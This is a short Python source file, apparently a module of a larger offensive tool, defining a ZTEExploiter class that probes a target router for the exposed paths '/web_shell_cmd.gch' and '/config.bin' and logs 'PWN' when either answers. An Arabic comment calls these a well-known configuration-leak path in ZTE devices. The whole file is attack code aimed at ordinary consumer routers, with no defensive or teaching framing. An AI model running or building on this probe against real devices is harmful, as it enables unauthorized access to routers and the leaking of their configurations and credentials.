from engines.utils import log, get_session

class ZTEExploiter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = get_session()

    def run_exploit(self):
        log("Testing ZTE Router specific vulnerabilities...")
        # مسار مشهور لتسريب الإعدادات في أجهزة ZTE
        paths = ["/web_shell_cmd.gch", "/config.bin"]
        for path in paths:
            url = self.target_url + path
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    log(f"ZTE Exploit Success! Path found: {url}", "PWN")
                    return True
            except: pass
        return False
